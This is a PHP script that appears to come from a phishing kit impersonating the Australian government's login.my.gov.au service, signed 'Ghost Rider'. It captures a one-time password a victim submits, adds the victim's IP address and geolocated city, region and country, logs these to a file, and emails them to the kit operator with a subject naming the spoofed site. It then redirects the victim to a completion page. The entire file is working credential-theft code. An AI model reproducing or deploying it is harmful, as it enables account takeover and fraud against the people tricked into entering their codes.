<?php
	
	$email = $_POST['otp'];
    require_once('../Email.php');
	require_once('geoplugin.class.php');
	$geoplugin = new geoPlugin();

    //get user's ip address 
    $geoplugin->locate();
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
    } else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
    }
	if($email != null){

    $message = "";
    $message .= "---|Ghost Rider|---\n";
    $message .= "OTP: " .$email. "\n"; 
    $message .= "IP : " .$ip. "\n"; 
    $message .= "--------------------------\n";
    $message .=     "City: {$geoplugin->city}\n";
    $message .=     "Region: {$geoplugin->region}\n";
    $message .=     "Country Name: {$geoplugin->countryName}\n";
    $message .=     "Country Code: {$geoplugin->countryCode}\n";
    $message .= "--------------------------\n";
	
	$handle = fopen("../JOB.txt", "a");
	fwrite($handle, $message);
	fclose($handle);

	$subject = "login.my.gov.au l $ip";
	$headers = "From: Result@cok.com";

	{
	mail("$send",$subject,$message,$headers);
	}
	}
?>
<script>
	window.location="../complate.html";
</script>

